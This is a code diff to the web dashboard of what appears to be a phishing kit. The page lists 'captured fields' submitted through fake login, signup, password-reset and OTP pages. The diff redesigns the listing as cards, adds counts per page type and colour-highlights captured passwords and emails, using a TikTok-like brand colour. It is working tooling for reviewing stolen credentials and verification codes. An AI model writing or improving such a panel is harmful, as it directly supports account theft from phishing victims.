@@ -7,7 +7,7 @@
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0a0a0f; color: #e4e6eb; padding: 24px; }
-    .top-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+    .top-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid rgba(255,255,255,.08); }
     h1 { font-size: 22px; }
     .top-actions { display: flex; gap: 10px; }
     .top-actions button { padding: 8px 16px; border: none; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; transition: opacity .15s; }
@@ -15,15 +15,110 @@
     #refreshBtn { background: #0b57d0; color: #fff; }
     #clearBtn { background: #d32f2f; color: #fff; }
     #logoutBtn { background: rgba(255,255,255,.08); color: #fff; border: 1px solid rgba(255,255,255,.15); }
-    table { width: 100%; border-collapse: collapse; }
-    th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid rgba(255,255,255,.08); font-size: 14px; }
-    th { background: rgba(255,255,255,.04); color: #888; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
-    tr:hover { background: rgba(255,255,255,.03); }
+    
+    /* Card-based layout */
+    .entries-container {
+      display: grid;
+      gap: 16px;
+    }
+    .entry-card {
+      background: rgba(255,255,255,.03);
+      border: 1px solid rgba(255,255,255,.08);
+      border-radius: 12px;
+      padding: 20px;
+      transition: all 0.2s;
+    }
+    .entry-card:hover {
+      background: rgba(255,255,255,.05);
+      border-color: rgba(255,255,255,.12);
+    }
+    .entry-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid rgba(255,255,255,.06);
+    }
+    .entry-badge {
+      display: inline-block;
+      padding: 6px 12px;
+      background: rgba(254,44,85,.15);
+      color: #fe2c55;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    .entry-badge.login { background: rgba(11,87,208,.15); color: #4fc3f7; }
+    .entry-badge.signup { background: rgba(16,185,129,.15); color: #10b981; }
+    .entry-badge.otp { background: rgba(245,158,11,.15); color: #f59e0b; }
+    .entry-badge.password-reset { background: rgba(239,68,68,.15); color: #ef4444; }
+    .entry-time {
+      font-size: 13px;
+      color: #888;
+    }
+    .entry-fields {
+      display: grid;
+      gap: 12px;
+    }
+    .field-row {
+      display: grid;
+      grid-template-columns: 180px 1fr;
+      gap: 12px;
+      align-items: start;
+      padding: 10px 14px;
+      background: rgba(0,0,0,.2);
+      border-radius: 8px;
+    }
+    .field-label {
+      font-size: 12px;
+      font-weight: 600;
+      color: #888;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    .field-value {
+      font-size: 14px;
+      color: #4fc3f7;
+      font-family: 'Courier New', monospace;
+      word-break: break-all;
+    }
+    .field-value.password {
+      color: #f59e0b;
+    }
+    .field-value.email {
+      color: #10b981;
+    }
     .empty { color: #555; padding: 60px; text-align: center; font-size: 15px; }
-    .field-key { color: #888; }
-    .field-val { color: #4fc3f7; }
     .loading { text-align: center; padding: 60px; color: #555; }
     .auth-gate { display: flex; align-items: center; justify-content: center; min-height: 80vh; color: #555; font-size: 15px; }
+    .stats-bar {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+    .stat-item {
+      flex: 1;
+      background: rgba(255,255,255,.03);
+      border: 1px solid rgba(255,255,255,.08);
+      border-radius: 10px;
+      padding: 16px;
+      text-align: center;
+    }
+    .stat-number {
+      font-size: 28px;
+      font-weight: 700;
+      color: #fe2c55;
+    }
+    .stat-label {
+      font-size: 12px;
+      color: #888;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-top: 4px;
+    }
   </style>
 </head>
 <body>
@@ -39,6 +134,7 @@
         <button id="logoutBtn" onclick="logout()">↪ Logout</button>
       </div>
     </div>
+    <div id="statsBar" class="stats-bar"></div>
     <div id="content"><div class="loading">Loading…</div></div>
   </div>
 
@@ -85,22 +181,100 @@
         if (res.status === 401) return redirectToLogin();
         const data = await res.json();
         const el = document.getElementById('content');
+        const statsEl = document.getElementById('statsBar');
 
         if (!data.length) {
           el.innerHTML = '<p class="empty">No submissions yet.</p>';
+          statsEl.innerHTML = '';
           return;
         }
 
-        let html = '<table><thead><tr><th>#</th><th>Time</th><th>Page</th><th>Captured Fields</th></tr></thead><tbody>';
-        data.forEach((entry, i) => {
-          const fields = entry.fields || {};
-          const fieldStr = Object.entries(fields)
-            .map(([k, v]) => `<span class="field-key">${k}:</span> <span class="field-val">${v}</span>`)
-            .join(' &nbsp;|&nbsp; ');
-          const time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '—';
-          html += `<tr><td>${i + 1}</td><td>${time}</td><td>${entry.page || '—'}</td><td>${fieldStr || '—'}</td></tr>`;
+        // Calculate stats
+        const stats = {
+          total: data.length,
+          login: 0,
+          signup: 0,
+          'password-reset': 0,
+          otp: 0
+        };
+        
+        data.forEach(entry => {
+          const page = (entry.page || '').toLowerCase();
+          if (page.includes('login')) stats.login++;
+          else if (page.includes('signup')) stats.signup++;
+          else if (page.includes('password') || page.includes('reset')) stats['password-reset']++;
+          else if (page.includes('otp') || page.includes('verify')) stats.otp++;
         });
-        html += '</tbody></table>';
+
+        statsEl.innerHTML = `
+          <div class="stat-item">
+            <div class="stat-number">${stats.total}</div>
+            <div class="stat-label">Total</div>
+          </div>
+          <div class="stat-item">
+            <div class="stat-number" style="color:#4fc3f7">${stats.login}</div>
+            <div class="stat-label">Logins</div>
+          </div>
+          <div class="stat-item">
+            <div class="stat-number" style="color:#10b981">${stats.signup}</div>
+            <div class="stat-label">Signups</div>
+          </div>
+          <div class="stat-item">
+            <div class="stat-number" style="color:#ef4444">${stats['password-reset']}</div>
+            <div class="stat-label">Password Resets</div>
+          </div>
+          <div class="stat-item">
+            <div class="stat-number" style="color:#f59e0b">${stats.otp}</div>
+            <div class="stat-label">OTP Verifications</div>
+          </div>
+        `;
+
+        // Render cards
+        let html = '<div class="entries-container">';
+        data.slice().reverse().forEach((entry, index) => {
+          const fields = entry.fields || {};
+          const page = entry.page || 'Unknown';
+          const time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '—';
+          
+          // Determine badge class
+          let badgeClass = '';
+          const pageLower = page.toLowerCase();
+          if (pageLower.includes('login') && !pageLower.includes('reset')) badgeClass = 'login';
+          else if (pageLower.includes('signup')) badgeClass = 'signup';
+          else if (pageLower.includes('otp') || pageLower.includes('verify')) badgeClass = 'otp';
+          else if (pageLower.includes('password') || pageLower.includes('reset')) badgeClass = 'password-reset';
+          
+          html += `
+            <div class="entry-card">
+              <div class="entry-header">
+                <span class="entry-badge ${badgeClass}">${page}</span>
+                <span class="entry-time">${time}</span>
+              </div>
+              <div class="entry-fields">
+          `;
+          
+          Object.entries(fields).forEach(([key, value]) => {
+            let valueClass = 'field-value';
+            if (key.toLowerCase().includes('password') || key.toLowerCase().includes('pwd')) {
+              valueClass += ' password';
+            } else if (key.toLowerCase().includes('email')) {
+              valueClass += ' email';
+            }
+            
+            html += `
+              <div class="field-row">
+                <div class="field-label">${key}</div>
+                <div class="${valueClass}">${value}</div>
+              </div>
+            `;
+          });
+          
+          html += `
+              </div>
+            </div>
+          `;
+        });
+        html += '</div>';
         el.innerHTML = html;
       } catch (e) {
         document.getElementById('content').innerHTML = '<p class="empty">Failed to load data.</p>';
